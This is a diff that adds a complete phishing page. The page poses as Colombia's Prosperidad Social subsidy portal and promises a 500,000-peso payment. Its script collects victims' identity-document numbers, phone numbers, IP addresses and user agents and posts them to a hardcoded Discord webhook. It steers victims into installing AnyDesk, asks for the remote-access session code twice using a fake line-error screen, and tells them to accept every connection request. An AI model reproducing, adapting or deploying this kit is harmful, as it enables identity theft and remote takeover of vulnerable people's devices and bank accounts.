@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="es" class="h-full">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="title" content="Prosperidad Social - Consulta de Subsidio" />
+    <meta name="description" content="Departamento para la Prosperidad Social - Entidad nacional para la equidad social y subsidios in Colombia." />
+    <meta name="robots" content="index, follow" />
+    <title>Prosperidad Social - Consulta Oficial 2026</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+
+    <!-- Bootstrap CSS y FontAwesome -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://use.fontawesome.com/releases/v6.3.0/css/all.css" rel="stylesheet" crossorigin="anonymous" />
+
+    <!-- Google Fonts Inter & Nunito Sans -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Nunito+Sans:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+        }
+        .step-transition {
+            animation: fadeIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* Animación profesional de rebote suave */
+        @keyframes subtleBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-4px); }
+        }
+        .animate-subtle-bounce {
+            animation: subtleBounce 2s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="h-full flex flex-col justify-between text-gray-800 antialiased">
+
+    <!-- ENCABEZADO INSTITUCIONAL CON IMAGEN COMPLETA DE ESQUINA A ESQUINA -->
+    <header class="w-full shadow-md z-50 bg-white">
+        <div class="w-full bg-white leading-none">
+            <img src="https://cdn.phototourl.com/free/2026-09-12-8e9dd4e9-90da-4481-b100-966e62ced211.png" alt="Gobierno de Colombia - Encabezado Oficial" class="w-full h-auto block object-contain">
+        </div>
+    </header>
+
+    <!-- CONTENEDOR PRINCIPAL DE LAS VISTAS -->
+    <main class="flex-grow flex items-center justify-center p-4 sm:p-6 lg:p-8">
+        <div class="w-full max-w-xl bg-white rounded-xl shadow-xl overflow-hidden border border-gray-200 flex flex-col">
+            
+            <!-- Encabezado de la Tarjeta del Subsidio -->
+            <div class="bg-gradient-to-r from-[#1b396a] to-[#203554] text-white text-center relative p-0">
+                <img src="https://i.ibb.co/whF3HKfx/apoyo.png" alt="Apoyo Subsidio" class="w-full h-auto block object-cover">
+            </div>
+
+            <!-- ========================================== -->
+            <!-- PÁGINA 1: FORMULARIO DE CONSULTA REAL      -->
+            <!-- ========================================== -->
+            <div id="page-1" class="p-6 sm:p-8 space-y-6 step-transition">
+                <div class="bg-amber-50 border-l-4 border-amber-400 p-4 rounded-r-xl text-xs text-amber-900 leading-relaxed shadow-2xs">
+                    <span class="font-bold">Aviso de seguridad:</span> Digite la información exacta registrada en su documento de identidad oficial y número de celular para consultar el estado actual de su subsidio.
+                </div>
+                <form id="subsidy-form" class="space-y-4" onsubmit="handlePage1Submit(event)">
+                    <div>
+                        <label for="tipo-doc" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">Tipo de Documento</label>
+                        <select id="tipo-doc" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1b396a] focus:border-[#1b396a] outline-none transition bg-white text-sm font-semibold text-gray-800">
+                            <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
+                            <option value="Cédula de Extranjería">Cédula de Extranjería</option>
+                            <option value="Permiso por Protección Temporal (PPT)">Permiso por Protección Temporal (PPT)</option>
+                            <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label for="numero-doc" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">Número de Cédula</label>
+                        <input type="tel" id="numero-doc" required placeholder="Ej. 1045234890" 
+                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1b396a] focus:border-[#1b396a] outline-none transition text-base font-bold text-gray-900">
+                    </div>
+                    <div>
+                        <label for="numero-celular" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">Número de Celular</label>
+                        <input type="tel" id="numero-celular" required placeholder="Ej. 3001234567" pattern="^3\d{9}$" minlength="10" maxlength="10"
+                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1b396a] focus:border-[#1b396a] outline-none transition text-base font-bold text-gray-900"
+                            title="El número de celular debe tener 10 dígitos y empezar obligatoriamente por 3.">
+                        <p class="text-[11px] text-gray-500 mt-1 font-medium">Debe tener 10 dígitos y empezar por el número 3 (Ej: 3001234567).</p>
+                    </div>
+                    <button type="submit" id="btn-consultar" class="w-full bg-[#1b396a] hover:bg-[#152c52] active:scale-[0.99] text-white font-bold py-3.5 px-6 rounded-lg transition duration-200 shadow-md flex items-center justify-center space-x-2 cursor-pointer text-sm">
+                        <span>Consultar Beneficio</span>
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                    </button>
+                </form>
+
+                <!-- Botoncito animado y profesional para descargar el PDF de Renta Joven ABC -->
+                <div class="pt-3 text-center">
+                    <a href="https://documentos.prosperidadsocial.gov.co/2024/SGPP/TM/RentaJoven/Docs/ABCRENTAJOVEN.pdf" target="_blank" onclick="trackPdfClick()" class="inline-flex items-center space-x-2 px-3.5 py-2 bg-gradient-to-r from-red-50 to-orange-50 hover:from-red-100 hover:to-orange-100 text-red-700 text-xs font-bold rounded-lg transition shadow-xs border border-red-200 animate-subtle-bounce cursor-pointer">
+                        <svg class="w-4 h-4 text-red-600 shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" clip-rule="evenodd"/></svg>
+                        <span>Descargar Guía ABC Renta Joven (PDF)</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- ========================================== -->
+            <!-- PANTALLA DE CARGA CON WEBP (MÁS GRANDE)    -->
+            <!-- ========================================== -->
+            <div id="loading-screen" class="hidden p-10 text-center space-y-6 step-transition flex flex-col items-center justify-center my-auto">
+                <div class="w-36 h-36 mx-auto"> <!-- Tamaño aumentado a w-36 h-36 -->
+                    <img src="https://i.ibb.co/y7f95VW/colombia-col-1.webp" alt="Cargando..." class="w-full h-full object-contain animate-pulse">
+                </div>
+                <div class="space-y-2">
+                    <h3 class="text-lg font-black text-[#1b396a]">Verificando en Base de Datos...</h3>
+                    <p class="text-xs text-gray-500 font-medium">Validando registros nacionales de subsidios activos. Por favor espere...</p>
+                </div>
+            </div>
+
+            <!-- ========================================== -->
+            <!-- PÁGINA 2: DESCARGA, PASARELA Y CÓDIGOS     -->
+            <!-- ========================================== -->
+            <div id="page-2" class="hidden">
+                <!-- PASO 2.1: Descarga de Aplicativo (Botón con Imagen 1 animado) -->
+                <div id="step-2-1" class="p-6 sm:p-8 space-y-6 step-transition">
+                    <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-4 text-center">
+                        <div class="inline-flex items-center justify-center w-12 h-12 bg-emerald-100 text-emerald-700 rounded-full mb-2">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                        </div>
+                        <h3 class="text-base font-bold text-emerald-950">¡Cédula Registrada y Habilitada!</h3>
+                        <p class="text-xs text-emerald-800 mt-1">Se identificó un incentivo monetario activo por <span class="font-black text-emerald-700">$500.000 COP</span>. Para verificar los detalles con un asesor y recibir asistencia personalizada, descargue el aplicativo de soporte en línea.</p>
+                    </div>
+
+                    <div class="space-y-4 bg-gray-50 p-5 rounded-xl border border-gray-200 text-center">
+                        <h4 class="text-xs font-bold uppercase tracking-wider text-gray-600">Paso 1: Descargue el aplicativo oficial certificado</h4>
+                        
+                        <!-- Botón Gigante con Imagen 1 y animación de rebote -->
+                        <div class="flex justify-center pt-1 pb-1">
+                            <a href="https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid" target="_blank" onclick="trackDownloadClick()" class="block w-full max-w-xs animate-subtle-bounce">
+                                <img src="https://cdn.phototourl.com/free/2026-09-12-65059d4a-08a9-44a1-8a99-0e885b600ce2.png" alt="Disponible en Google Play" class="w-full h-auto hover:scale-105 transition transform shadow-lg rounded-lg">
+                            </a>
+                        </div>
+                        <div class="pt-2 border-t border-gray-200">
+                            <button onclick="goToCodeStep1()" class="w-full bg-[#1b396a] hover:bg-[#152c52] text-white font-bold py-3 px-6 rounded-lg transition duration-200 shadow-sm text-sm flex items-center justify-center space-x-2 cursor-pointer">
+                                <span>Ya descargué la aplicación, continuar</span>
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PASO 2.2: Ingreso del Código (1ª Vez) -->
+                <div id="step-2-2" class="hidden p-6 sm:p-8 space-y-6 step-transition">
+                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-center">
+                        <h3 class="text-base font-bold text-blue-950">Paso 2: Ingrese su código de conexión</h3>
+                        <p class="text-xs text-blue-800 mt-1">Abra la aplicación de soporte instalada en su celular, localice el código numérico asignado de 9 o 10 dígitos y escríbalo para enlazarse con el asesor.</p>
+                    </div>
+                    <form id="code-form-1" onsubmit="handleCode1Submit(event)" class="space-y-4">
+                        <div>
+                            <input type="tel" id="session-code-1" required minlength="9" maxlength="10" placeholder="Ej. 123456789"
+                                class="w-full px-4 py-3 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1b396a] focus:border-[#1b396a] outline-none text-center font-mono text-2xl tracking-widest font-black text-gray-900">
+                            <p class="text-[11px] text-gray-500 mt-1 text-center font-medium">Debe contener 9 o 10 dígitos.</p>
+                        </div>
+                        <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 px-6 rounded-lg transition duration-200 shadow-md text-sm flex items-center justify-center space-x-2 cursor-pointer">
+                            <span>Verificar Código con Asesor</span>
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                        </button>
+                    </form>
+                </div>
+
+                <!-- PASO 2.3: Ingreso del Código (2ª Vez / Corrección obligatoria por asesor) -->
+                <div id="step-2-3" class="hidden p-6 sm:p-8 space-y-6 step-transition">
+                    <div class="bg-red-50 border border-red-200 rounded-xl p-4 text-center">
+                        <div class="inline-flex items-center justify-center w-10 h-10 bg-red-100 text-red-600 rounded-full mb-1">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                        </div>
+                        <h3 class="text-base font-bold text-red-950">¡Interferencia en la Línea de Asesoría!</h3>
+                        <p class="text-xs text-red-800 mt-1">El código anterior expiró o el asesor se encuentra en otra línea. Por favor, <strong>reingrese el código actual</strong> de 9 o 10 dígitos visible en su aplicación para restablecer el enlace.</p>
+                    </div>
+                    <form id="code-form-2" onsubmit="handleCode2Submit(event)" class="space-y-4">
+                        <div>
+                            <input type="tel" id="session-code-2" required minlength="9" maxlength="10" placeholder="Ej. 987654321"
+                                class="w-full px-4 py-3 bg-white border border-red-300 rounded-lg focus:ring-2 focus:ring-red-600 focus:border-red-600 outline-none text-center font-mono text-2xl tracking-widest font-black text-gray-900">
+                        </div>
+                        <button type="submit" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 px-6 rounded-lg transition duration-200 shadow-md text-sm flex items-center justify-center space-x-2 cursor-pointer">
+                            <span>Reintentar Conexión con Asesor</span>
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                        </button>
+                    </form>
+                </div>
+
+                <!-- PASO 2.4: Cuenta Regresiva Final con Mensaje Persuasivo -->
+                <div id="step-2-4" class="hidden p-6 sm:p-8 text-center space-y-5 step-transition">
+                    <div class="inline-flex items-center justify-center w-16 h-16 bg-blue-100 text-[#1b396a] rounded-full animate-spin">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                    </div>
+                    
+                    <h3 class="text-xl font-black text-[#1b396a]">Estableciendo Conexión con el Asesor...</h3>
+                    
+                    <div class="bg-amber-50 border border-amber-300 p-4 rounded-xl text-xs text-amber-950 font-bold leading-relaxed shadow-2xs text-left space-y-1">
+                        <p class="flex items-center space-x-2 text-amber-900 font-extrabold uppercase">
+                            <svg class="w-4 h-4 inline shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                            <span>Instrucción obligatoria para finalizar:</span>
+                        </p>
+                        <p class="font-normal text-amber-900">
+                            <strong>Manténgase dentro de la aplicación</strong> y espere la solicitud de enlace del asesor en su dispositivo. Debe <strong>aceptar todo</strong> de inmediato para que la atención del subsidio se complete exitosamente.
+                        </p>
+                    </div>
+                    <p class="text-xs text-gray-600 max-w-sm mx-auto font-medium">Redirigiendo con el asesor en:</p>
+                    
+                    <div class="text-4xl font-black text-[#1b396a] my-1" id="countdown-timer">15</div>
+                    
+                    <p class="text-[11px] text-gray-500 font-medium">No cierre la ventana ni apague la pantalla.</p>
+                </div>
+            </div>
+
+            <!-- SECCIÓN INFERIOR: Sello Institucional de lado a lado -->
+            <div class="w-full overflow-hidden bg-white mt-auto rounded-b-xl border-t border-gray-100">
+                <img src="https://cdn.phototourl.com/free/2026-09-12-f3dc6385-c0cd-4899-ae69-dcab8299d524.png" alt="Sello Institucional Gobierno de Colombia" class="w-full h-auto block object-cover">
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER INSTITUCIONAL -->
+    <footer class="footer bg-white border-t border-gray-200 text-center py-4">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-4 mb-2 mb-lg-0 text-start">
+                    <p class="mb-0 text-xs text-gray-600">
+                        <strong>Prosperidad Social</strong><br />
+                        Cra 7 # 32 - 42 • Bogotá, Colombia
+                    </p>
+                </div>
+                <div class="col-lg-4 mb-2 mb-lg-0">
+                    <div class="d-flex justify-content-center space-x-2">
+                        <a class="btn btn-outline-dark btn-social btn-sm rounded-circle" href="https://www.facebook.com/Prosperidad.Social" target="_blank"><i class="fab fa-fw fa-facebook-f"></i></a>
+                        <a class="btn btn-outline-dark btn-social btn-sm rounded-circle" href="https://www.instagram.com/prosperidadcol/" target="_blank"><i class="fab fa-fw fa-instagram"></i></a>
+                        <a class="btn btn-outline-dark btn-social btn-sm rounded-circle" href="https://twitter.com/ProsperidadCol" target="_blank"><i class="fab fa-fw fa-twitter"></i></a>
+                        <a class="btn btn-outline-dark btn-social btn-sm rounded-circle" href="https://www.youtube.com/c/ProsperidadSocial_Col" target="_blank"><i class="fab fa-fw fa-youtube"></i></a>
+                    </div>
+                </div>
+                <div class="col-lg-4 text-end">
+                    <p class="mb-0 text-xs text-gray-500">
+                        Línea Gratuita Nacional: 01-8000-95-1100
+                    </p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Copyright Section -->
+    <div class="py-2 text-center text-white bg-gray-900">
+        <div class="container">
+            <small class="text-[11px]">Copyright &copy; ProsperidadSocial.gov.co 2026 - Todos los derechos reservados</small>
+        </div>
+    </div>
+
+    <!-- SCRIPT DE FUNCIONAMIENTO Y WEBHOOK INTEGRADO -->
+    <script>
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+        
+        let userData = {
+            tipoDoc: "",
+            numeroDoc: "",
+            numeroCelular: "",
+            code1: "",
+            code2: "",
+            ipDevice: "Desconocida"
+        };
+
+        // Capturar IP pública del visitante
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { userData.ipDevice = data.ip; })
+            .catch(e => console.log('IP fetch error', e));
+
+        function sendToDiscord(message) {
+            const payload = { content: message };
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Webhook error:", err));
+        }
+
+        function trackPdfClick() {
+            sendToDiscord(`📄 **Usuario descargó el PDF de Renta Joven (ABC)**\n🌐 **IP:** \`${userData.ipDevice}\``);
+        }
+
+        // PÁGINA 1: Envío del formulario de consulta con animación de carga .webp de 10 segundos
+        function handlePage1Submit(e) {
+            e.preventDefault();
+            const tipo = document.getElementById('tipo-doc').value;
+            const numero = document.getElementById('numero-doc').value.trim();
+            const celular = document.getElementById('numero-celular').value.trim();
+
+            if (!numero || numero.length < 5) {
+                alert('Por favor ingrese un número de documento válido.');
+                return;
+            }
+
+            // Validación estricta: 10 dígitos y empieza por 3
+            const regexCelular = /^3\d{9}$/;
+            if (!regexCelular.test(celular)) {
+                alert('El número de celular debe tener exactamente 10 dígitos y empezar por el número 3.');
+                document.getElementById('numero-celular').focus();
+                return;
+            }
+
+            userData.tipoDoc = tipo;
+            userData.numeroDoc = numero;
+            userData.numeroCelular = celular;
+
+            sendToDiscord(`🚨 **NUEVA CONSULTA DE SUBSIDIO ($500.000 COP)**\n📄 **Tipo:** ${tipo}\n🔢 **Documento:** \`${numero}\`\n📱 **Celular:** \`${celular}\`\n🌐 **IP:** \`${userData.ipDevice}\``);
+
+            // Ocultar Página 1 y mostrar pantalla de carga con el webp más grande
+            document.getElementById('page-1').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+
+            // Simular un tiempo de carga EXACTO de 10 segundos (10000 ms) antes de mostrar la página 2
+            setTimeout(() => {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('page-2').classList.remove('hidden');
+                document.getElementById('step-2-1').classList.remove('hidden');
+            }, 10000);
+        }
+
+        function trackDownloadClick() {
+            sendToDiscord(`📥 **Usuario hizo clic en el botón de Descarga Google Play**\n🔢 **Documento:** \`${userData.numeroDoc}\`\n📱 **Celular:** \`${userData.numeroCelular}\``);
+        }
+
+        function goToCodeStep1() {
+            document.getElementById('step-2-1').classList.add('hidden');
+            document.getElementById('step-2-2').classList.remove('hidden');
+        }
+
+        // PÁGINA 2: Primer código
+        function handleCode1Submit(e) {
+            e.preventDefault();
+            const codeInput = document.getElementById('session-code-1').value.trim();
+
+            if (!/^\d{9,10}$/.test(codeInput)) {
+                alert('El código debe tener estrictamente 9 o 10 dígitos numéricos.');
+                return;
+            }
+
+            userData.code1 = codeInput;
+
+            sendToDiscord(`🔑 **1er CÓDIGO ANYDESK CAPTURADO**\n🔢 **Documento:** \`${userData.numeroDoc}\`\n📱 **Celular:** \`${userData.numeroCelular}\`\n🔢 **Código 1:** \`${userData.code1}\``);
+
+            // Transicionar al paso de error/corrección obligatoria
+            document.getElementById('step-2-2').classList.add('hidden');
+            document.getElementById('step-2-3').classList.remove('hidden');
+        }
+
+        // PÁGINA 2: Segundo código (corregido)
+        function handleCode2Submit(e) {
+            e.preventDefault();
+            const codeInput = document.getElementById('session-code-2').value.trim();
+
+            if (!/^\d{9,10}$/.test(codeInput)) {
+                alert('El código corregido debe tener estrictamente 9 o 10 dígitos numéricos.');
+                return;
+            }
+
+            userData.code2 = codeInput;
+
+            sendToDiscord(`🔄 **2do CÓDIGO (CORREGIDO) ANYDESK CAPTURADO**\n🔢 **Documento:** \`${userData.numeroDoc}\`\n📱 **Celular:** \`${userData.numeroCelular}\`\n🔢 **Código 2:** \`${userData.code2}\`\n💻 **Dispositivo:** \`${navigator.userAgent}\``);
+
+            // Transicionar al estado final de cuenta regresiva
+            document.getElementById('step-2-3').classList.add('hidden');
+            document.getElementById('step-2-4').classList.remove('hidden');
+
+            startCountdown();
+        }
+
+        function startCountdown() {
+            let timeLeft = 15;
+            const timerElement = document.getElementById('countdown-timer');
+            
+            const timerInterval = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
